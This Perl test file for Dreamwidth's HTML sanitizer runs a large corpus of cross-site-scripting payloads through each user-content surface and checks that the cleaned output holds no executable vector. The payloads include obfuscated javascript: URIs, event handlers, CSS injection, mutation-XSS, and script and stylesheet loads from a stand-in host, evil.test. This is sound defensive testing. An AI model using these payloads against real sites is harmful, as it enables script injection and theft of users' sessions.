# t/cleaner-xss.t
#
# Adversarial XSS corpus for LJ::CleanHTML. Pushes a library of known
# cross-site-scripting vectors (classic, HTML5, scheme-obfuscation, CSS, and
# mutation-XSS) through every surface user content flows through -- entries and
# comments in each formatting mode (default html, preformatted, markdown,
# syndicated feed HTML), plus subjects and user bios -- and asserts that no
# JavaScript-execution vector survives in the cleaned output. A markdown-only
# vector set covers what Text::Markdown can generate before the clean runs.
#
# The check is a heuristic "does an exec vector remain" oracle (see is_unsafe),
# not exact-output matching, so it stays meaningful as cleaner internals change.
#
# A TODO section documents a known gap: clean_event (permissive allow-most mode)
# lets SVG/MathML foreign content and its SMIL/XML-Events children through with
# only attribute-level filtering, whereas clean_comment (strict allowlist)
# strips them. Those vectors are browser-dependent today but are the class a
# namespace-aware HTML5 sanitizer would close; the TODO assertions flip to
# passing if/when that is fixed.
#
# Copyright (c) 2026 by Dreamwidth Studios, LLC.
#
# This program is free software; you may redistribute it and/or modify it under
# the same terms as Perl itself. For a copy of the license, please reference
# 'perldoc perlartistic' or 'perldoc perlgpl'.

use strict;
use warnings;

use Test::More;

BEGIN { require "$ENV{LJHOME}/t/lib/ljtestlib.pl"; }
use LJ::CleanHTML;
use HTMLCleaner;
use LJ::Hooks;
use LJ::Web;            # LJ::img, used by the anon-comment / extract-images path
use LJ::EmbedModule;    # clean_embed path

# The malformed-markup error path inside clean() calls LJ::Lang::ml; stub it so
# these tests don't need a populated translation DB.
no warnings 'redefine';
local *LJ::Lang::ml = sub { return "[ml:$_[0]]"; };
use warnings 'redefine';

# ---------------------------------------------------------------------------
# Safety oracle: return a list of execution vectors still present in $html.
# Empty list == safe. Quoted attribute VALUES are stripped before scanning for
# event handlers so escaped junk inside e.g. title="...onerror=..." (which is
# inert) does not register as a live handler.
# ---------------------------------------------------------------------------
# Named entities an attacker can hide a URL scheme behind: the colon, plus the
# whitespace ones a browser strips out of a scheme name.
my %NAMED_ENT = ( colon => ':', tab => "\t", newline => "\n" );

# Decode entities ONCE, left to right, the way a browser does at parse time --
# so a raw "&Tab;" becomes a tab (dangerous if inside a scheme) but an already
# escaped "&amp;Tab;" stays literal text (inert) and is not re-decoded.
sub decode_entities_once {
    my ($s) = @_;
    $s =~ s{
        & (?: \#x([0-9a-f]+) | \#(\d+) | ([a-z][a-z0-9]*) ) ;?
    }{
          defined $1                   ? chr( hex $1 )
        : defined $2                   ? chr($2)
        : exists $NAMED_ENT{ lc $3 }   ? $NAMED_ENT{ lc $3 }
        :                                "&$3;"
    }giex;
    return $s;
}

# opts: allow_media => 1 permits <object>/<embed>/<iframe> as tags (the embed
# path intentionally keeps them for trusted media); their attributes are still
# checked below, so a media tag carrying a handler or javascript: still fails.
sub is_unsafe {
    my ( $html, %opt ) = @_;
    my %bad;

    $bad{'script-tag'} = 1 if $html =~ /<\s*script/i;
    unless ( $opt{allow_media} ) {
        $bad{'iframe'} = 1 if $html =~ /<\s*iframe/i;
        $bad{'object'} = 1 if $html =~ /<\s*object\b/i;
        $bad{'embed'}  = 1 if $html =~ /<\s*embed\b/i;
    }
    $bad{'base'}            = 1 if $html =~ /<\s*base\b/i;
    $bad{'meta-http-equiv'} = 1 if $html =~ /<\s*meta[^>]*http-equiv/i;

    while ( $html =~ /(<[a-z!\/][^>]*>)/gi ) {
        my $tag  = $1;
        my $bare = $tag;
        $bare =~ s/"[^"]*"//g;
        $bare =~ s/'[^']*'//g;
        $bad{'event-handler'} = 1 if $bare =~ /[\s"'\/]on[a-z]+\s*=/i;
        $bad{'srcdoc'}        = 1 if $bare =~ /[\s"'\/]srcdoc\s*=/i;

        my $t = decode_entities_once($tag);
        $t =~ s/[\x00-\x20]+//g;    # browsers ignore whitespace/control chars in URLs and schemes
        $bad{'js-uri'} = 1
            if $t =~
/(?:href|src|action|formaction|xlink:href|poster|background|data|to|values|from)=["']?(?:javascript|vbscript|livescript|mocha):/i;
        $bad{'data-html'} = 1 if $t =~ m{=["']?data:text/html}i;
    }

    # CSS execution vectors (script-y CSS, external @import, binding) only matter
    # inside a style="" value or a <style> block. Scope the checks there so benign
    # body text containing "@import" or "behavior:" can't false-positive.
    my @css;
    push @css, $1 while $html =~ /<style[^>]*>(.*?)<\/style>/gis;
    push @css, $1 while $html =~ /\bstyle\s*=\s*"([^"]*)"/gi;
    push @css, $1 while $html =~ /\bstyle\s*=\s*'([^']*)'/gi;
    for my $raw (@css) {
        my $c = decode_entities_once($raw);
        ( my $nows = $c ) =~ s/[\x00-\x20]+//g;
        $bad{'css-expression'} = 1 if $c =~ /expression\s*\(/i;
        $bad{'css-binding'}    = 1 if $c =~ /-moz-binding/i || $c =~ /\bbehaviou?r\s*:/i;
        $bad{'css-import'}     = 1 if $c =~ /\@import/i;
        $bad{'css-url-js'}     = 1 if $nows =~ /url\(["']?(?:javascript|vbscript):/i;
    }
    return sort keys %bad;
}

# The surfaces user content flows through. Each closure cleans a payload the way
# a given (entry point x formatting mode) does in production and returns the
# result. Entries and comments both branch on formatting mode (default html,
# preformatted, markdown, syndicated feed HTML); subjects and bios are their own
# entry points with their own allowlists. The security-critical allow/eat/remove
# lists are the same across an entry point's modes -- markdown differs because it
# runs Text::Markdown first -- but each is exercised so a mode can't drift unsafe.
my @surfaces = (
    [ 'event/default' => sub { my $d = $_[0]; LJ::CleanHTML::clean_event( \$d ); $d } ],
    [
        'event/preformatted' =>
            sub { my $d = $_[0]; LJ::CleanHTML::clean_event( \$d, { preformatted => 1 } ); $d }
    ],
    [
        'event/markdown' =>
            sub { my $d = $_[0]; LJ::CleanHTML::clean_event( \$d, { editor => 'markdown0' } ); $d }
    ],
    [
        'event/syndicated' => sub {
            my $d = $_[0];
            LJ::CleanHTML::clean_event( \$d, { is_syndicated => 1, preformatted => 1 } );
            $d;
        }
    ],
    [ 'comment/default' => sub { my $d = $_[0]; LJ::CleanHTML::clean_comment( \$d ); $d } ],
    [
        'comment/anon' =>
            sub { my $d = $_[0]; LJ::CleanHTML::clean_comment( \$d, { anon_comment => 1 } ); $d }
    ],
    [
        'comment/markdown' => sub {
            my $d = $_[0];
            LJ::CleanHTML::clean_comment( \$d, { editor => 'markdown0' } );
            $d;
        }
    ],
    [
        'comment/preformatted' =>
            sub { my $d = $_[0]; LJ::CleanHTML::clean_comment( \$d, { preformatted => 1 } ); $d }
    ],
    [ 'subject'     => sub { my $d = $_[0]; LJ::CleanHTML::clean_subject( \$d );     $d } ],
    [ 'subject_all' => sub { my $d = $_[0]; LJ::CleanHTML::clean_subject_all( \$d ); $d } ],
    [
        'subject_trim' =>
            sub { my $d = $_[0]; LJ::CleanHTML::clean_and_trim_subject( \$d, 200 ); $d }
    ],
    [ 'userbio' => sub { my $d = $_[0]; LJ::CleanHTML::clean_userbio( \$d ); $d } ],
);
my %surf = map { $_->[0] => $_->[1] } @surfaces;

# ---------------------------------------------------------------------------
# Corpus the current cleaner already neutralizes -> hard regression assertions.
# ---------------------------------------------------------------------------
my @corpus = (
    [ 'script-plain'            => q{<script>alert(1)</script>} ],
    [ 'script-src'              => q{<script src="//evil.test/x.js"></script>} ],
    [ 'script-nested-break'     => q{<scr<script>ipt>alert(1)</scr</script>ipt>} ],
    [ 'script-uppercase'        => q{<SCRIPT>alert(1)</SCRIPT>} ],
    [ 'script-null'             => qq{<scri\x00pt>alert(1)</script>} ],
    [ 'img-onerror'             => q{<img src=x onerror=alert(1)>} ],
    [ 'img-onerror-quotes'      => q{<img src="x" onerror="alert(1)">} ],
    [ 'img-onerror-backtick'    => q{<img src=x onerror=alert`1`>} ],
    [ 'img-onerror-tab'         => qq{<img src=x on\terror=alert(1)>} ],
    [ 'img-onerror-formfeed'    => qq{<img src=x\x{0c}onerror=alert(1)>} ],
    [ 'body-onload'             => q{<body onload=alert(1)>} ],
    [ 'input-autofocus'         => q{<input autofocus onfocus=alert(1)>} ],
    [ 'details-ontoggle'        => q{<details open ontoggle=alert(1)>} ],
    [ 'div-onmouseover'         => q{<div onmouseover="alert(1)">x</div>} ],
    [ 'onpointerrawupdate'      => q{<div onpointerrawupdate=alert(1)>x</div>} ],
    [ 'onbeforetoggle'          => q{<div popover onbeforetoggle=alert(1)>x</div>} ],
    [ 'onscrollend'             => q{<div onscrollend=alert(1)>x</div>} ],
    [ 'attr-newline-handler'    => qq{<a href="x"\nonclick="alert(1)">y</a>} ],
    [ 'marquee-onstart'         => q{<marquee onstart=alert(1)>x</marquee>} ],
    [ 'video-source-onerror'    => q{<video><source onerror=alert(1)></video>} ],
    [ 'a-js-href'               => q{<a href="javascript:alert(1)">x</a>} ],
    [ 'a-js-href-entity'        => q{<a href="javascript&#58;alert(1)">x</a>} ],
    [ 'a-js-href-entity-hex'    => q{<a href="javascript&#x3a;alert(1)">x</a>} ],
    [ 'a-js-href-tab'           => qq{<a href="java\tscript:alert(1)">x</a>} ],
    [ 'a-js-href-newline'       => qq{<a href="java\nscript:alert(1)">x</a>} ],
    [ 'a-js-href-leading-space' => q{<a href=" javascript:alert(1)">x</a>} ],
    [ 'a-js-href-mixedcase'     => q{<a href="JaVaScRiPt:alert(1)">x</a>} ],
    [ 'a-js-href-uppercase-key' => q{<a HREF="javascript:alert(1)">x</a>} ],
    [ 'a-js-entity-tab-scheme'  => q{<a href="javasc&Tab;ript:alert(1)">x</a>} ],
    [ 'a-vbscript'              => q{<a href="vbscript:msgbox(1)">x</a>} ],
    [
        'a-data-html' =>
            q{<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>}
    ],
    [ 'img-data-html'  => q{<img src="data:text/html,<script>alert(1)</script>">} ],
    [ 'iframe-js'      => q{<iframe src="javascript:alert(1)"></iframe>} ],
    [ 'iframe-srcdoc'  => q{<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>} ],
    [ 'object-data-js' => q{<object data="javascript:alert(1)"></object>} ],
    [ 'embed-src-js'   => q{<embed src="javascript:alert(1)">} ],
    [ 'form-action-js' => q{<form action="javascript:alert(1)"><input type=submit></form>} ],
    [ 'button-formaction-js' => q{<button formaction="javascript:alert(1)">x</button>} ],
    [ 'isindex-formaction'   => q{<isindex type=image formaction=javascript:alert(1)>} ],
    [ 'base-href-js'         => q{<base href="javascript:alert(1)//">} ],
    [ 'meta-refresh-js' => q{<meta http-equiv="refresh" content="0;url=javascript:alert(1)">} ],
    [ 'bgsound-js'      => q{<bgsound src="javascript:alert(1)">} ],
    [ 'style-attr-expression'   => q{<div style="width:expression(alert(1))">x</div>} ],
    [ 'style-attr-expr-comment' => q{<div style="width:expr/**/ession(alert(1))">x</div>} ],
    [ 'style-attr-moz-binding'  => q{<div style="-moz-binding:url(//evil.test/x.xml#x)">x</div>} ],
    [ 'style-attr-behavior'     => q{<div style="behavior:url(#default#time2)">x</div>} ],
    [ 'style-attr-bg-js'        => q{<div style="background:url(javascript:alert(1))">x</div>} ],
    [ 'style-tag-import'        => q{<style>@import "//evil.test/x.css";</style>} ],
    [ 'style-tag-expr'          => q{<style>*{width:expression(alert(1))}</style>} ],
    [ 'link-stylesheet'         => q{<link rel="stylesheet" href="//evil.test/x.css">} ],
    [ 'mxss-noscript'      => q{<noscript><p title="</noscript><img src=x onerror=alert(1)>">} ],
    [ 'mxss-style-img'     => q{<style><style/><img src=x onerror=alert(1)>} ],
    [ 'mxss-style-comment' => q{<style><!--</style><img src=x onerror=alert(1)>--></style>} ],
    [ 'mxss-listing'       => q{<listing>&lt;img src=x onerror=alert(1)&gt;</listing>} ],
    [ 'mxss-xmp'           => q{<xmp><img src=x onerror=alert(1)></xmp>} ],
    [ 'mxss-textarea'      => q{<textarea><img src=x onerror=alert(1)></textarea>} ],
    [ 'mxss-title'         => q{<title><img src=x onerror=alert(1)></title>} ],
    [ 'mxss-template'      => q{<template><img src=x onerror=alert(1)></template>} ],
    [ 'comment-conditional-ie' => q{<!--[if gte IE 4]><script>alert(1)</script><![endif]-->} ],
);

# Markdown is the one mode with an extra generation step (Text::Markdown runs
# first, then the output is cleaned), so it has vectors only reachable through
# markdown syntax -- link/image destinations, reference links, autolinks, raw
# HTML passthrough, and code spans (which must be escaped, not executed).
my @markdown_corpus = (
    [ 'md-image-js'         => q{![x](javascript:alert(1))} ],
    [ 'md-link-js'          => q{[x](javascript:alert(1))} ],
    [ 'md-link-bracket-js'  => q{[x](<javascript:alert(1)>)} ],
    [ 'md-ref-link-js'      => qq{[x][1]\n\n[1]: javascript:alert(1)} ],
    [ 'md-autolink-js'      => q{<javascript:alert(1)>} ],
    [ 'md-raw-img-onerror'  => q{<img src=x onerror=alert(1)>} ],
    [ 'md-raw-script'       => q{<script>alert(1)</script>} ],
    [ 'md-raw-svg-onload'   => q{<svg onload=alert(1)></svg>} ],
    [ 'md-html-block'       => qq{<div>\n<img src=x onerror=alert(1)>\n</div>} ],
    [ 'md-code-span-html'   => q{`<img src=x onerror=alert(1)>`} ],
    [ 'md-link-title-quote' => q{[x](http://ok.test "a) onmouseover=alert(1) b")} ],
);

for my $s (@surfaces) {
    my ( $label, $clean ) = @$s;
    for my $case (@corpus) {
        my ( $name, $payload ) = @$case;
        my $out = $clean->($payload);
        my @bad = is_unsafe($out);
        ok( !@bad, "$label neutralizes $name" )
            or diag("surviving vectors: @bad\n  in : $payload\n  out: $out");
    }
}

for my $label ( 'event/markdown', 'comment/markdown' ) {
    for my $case (@markdown_corpus) {
        my ( $name, $payload ) = @$case;
        my $out = $surf{$label}->($payload);
        my @bad = is_unsafe($out);
        ok( !@bad, "$label neutralizes $name" )
            or diag("surviving vectors: @bad\n  in : $payload\n  out: $out");
    }
}

# clean_embed is the RTE media-embed path. Unlike the other surfaces it
# INTENTIONALLY keeps <object>/<embed>/<iframe> for trusted media, so the oracle
# runs with allow_media => 1: those tags are allowed, but script, event
# handlers, and javascript:/data: in their attributes must still not survive.
# (The production transform_embed hook that rewrites trusted embeds into iframes
# is not registered in the test config, so this exercises the sanitization, not
# the trusted-host transform, which is cleaner-embed.t's territory.)
my @embed_corpus = (
    [ 'embed-script'        => q{<script>alert(1)</script>} ],
    [ 'embed-object-script' => q{<object><script>alert(1)</script></object>} ],
    [ 'embed-iframe-js'     => q{<iframe src="javascript:alert(1)"></iframe>} ],
    [
        'embed-iframe-onload' =>
            q{<iframe src="https://www.youtube.com/embed/x" onload="alert(1)"></iframe>}
    ],
    [ 'embed-iframe-srcdoc'  => q{<iframe srcdoc="<script>alert(1)</script>"></iframe>} ],
    [ 'embed-object-data-js' => q{<object data="javascript:alert(1)"></object>} ],
    [ 'embed-embed-src-js'   => q{<embed src="javascript:alert(1)">} ],
    [ 'embed-embed-onmouse'  => q{<embed src="https://ok.test/v" onmouseover="alert(1)">} ],
    [
        'embed-object-onclick' =>
            q{<object onclick="alert(1)"><param name="movie" value="javascript:alert(1)"></object>}
    ],
    [ 'embed-embed-data-html' => q{<embed src="data:text/html,<script>alert(1)</script>">} ],
);

for my $case (@embed_corpus) {
    my ( $name, $payload ) = @$case;
    my $out = $payload;
    LJ::CleanHTML::clean_embed( \$out );
    my @bad = is_unsafe( $out, allow_media => 1 );
    ok( !@bad, "clean_embed neutralizes $name" )
        or diag("surviving vectors: @bad\n  in : $payload\n  out: $out");
}

# ---------------------------------------------------------------------------
# Known gap (documented, not yet fixed): clean_event's permissive allow-most
# mode lets SVG/MathML foreign content and SMIL/XML-Events children through.
# clean_comment's strict allowlist already strips them. These browser-dependent
# vectors are the class a namespace-aware HTML5 sanitizer would close. Wrapped
# in TODO so the suite stays green while recording exactly what is missed.
# ---------------------------------------------------------------------------
# The dangerous constructs that actually survive clean_event: SMIL animation
# that drives an event handler or a javascript: navigation, XML Events handlers,
# and MathML foreign-HTML embedding. (A bare <svg onload=> is NOT here -- the
# onload is already stripped; only these live children slip through.) Each
# asserts the element is gone, which a namespace-aware sanitizer would ensure.
my @gaps = (
    [
        'svg-set-onload' => q{<svg><set attributeName=onload to=alert(1)></set></svg>},
        qr/<\s*set\b/i
    ],
    [
        'svg-handler' => q{<svg><handler ev:event="load">alert(1)</handler></svg>},
        qr/<\s*handler\b/i
    ],
    [
        'svg-animate-href' =>
            q{<svg><a><animate attributeName=href to=javascript:alert(1)></animate></a></svg>},
        qr/<\s*animate\b/i
    ],
    [
        'math-annotation-html' =>
q{<math><annotation-xml encoding="text/html"><img src=x onerror=alert(1)></annotation-xml></math>},
        qr/annotation-xml/i
    ],
);

TODO: {
    local $TODO = "clean_event does not yet strip SVG/MathML foreign content "
        . "(namespace-aware sanitizer would; clean_comment already does)";

    for my $case (@gaps) {
        my ( $name, $payload, $must_not_match ) = @$case;
        my $out = $surf{'event/default'}->($payload);
        unlike( $out, $must_not_match, "clean_event strips $name" );
    }
}

# Sanity: clean_comment's strict allowlist DOES strip the same SVG/MathML
# (these are not TODO -- they pass today, guarding against regression).
for my $case (@gaps) {
    my ( $name, $payload, $must_not_match ) = @$case;
    my $out = $surf{'comment/default'}->($payload);
    unlike( $out, $must_not_match, "clean_comment strips $name" );
}

# Oracle self-check: the is_unsafe detector must actually SEE a browser-decodable
# obfuscated scheme (else a real cleaner regression could pass silently), and must
# NOT false-positive on an already-escaped, inert vector or on plain body text.
{
    my @seen;
    @seen = is_unsafe(q{<a href="javasc&Tab;ript:alert(1)">x</a>});
    ok( @seen, "oracle sees &Tab;-obfuscated scheme" );
    @seen = is_unsafe(q{<a href="javascript&#X3A;alert(1)">x</a>});
    ok( @seen, "oracle sees hex-entity (uppercase X, A-F) scheme" );
    @seen = is_unsafe(q{<img src=x onerror=alert(1)>});
    ok( @seen, "oracle sees a raw event handler" );

    @seen = is_unsafe(q{<a href="javasc&amp;Tab;ript:alert(1)">x</a>});
    ok( !@seen, "oracle ignores inert already-escaped &amp;Tab;" );
    @seen = is_unsafe(q{<p title="javascript:not-a-link onerror=text">hi</p>});
    ok( !@seen, "oracle ignores scheme/handler text inside a quoted attribute value" );
}

# Positive controls: the cleaner must PRESERVE benign content. Without these, a
# regression that simply strips everything (or returns "") would pass every
# "nothing dangerous survived" assertion above as vacuously safe.
like( $surf{'event/default'}->(q{<b>hi</b> <em>there</em>}),
    qr{<b>hi</b>.*<em>there</em>}, "event keeps benign inline formatting" );
like( $surf{'comment/default'}->(q{<b>hi</b> <em>there</em>}),
    qr{<b>hi</b>.*<em>there</em>}, "comment keeps benign inline formatting" );
like( $surf{'event/default'}->(q{<a href="http://example.com/">link</a>}),
    qr{<a[^>]*>link</a>}, "event keeps a safe link and its text" );
like( $surf{'event/default'}->(q{hello world}), qr{hello world}, "event keeps plain text" );

done_testing();
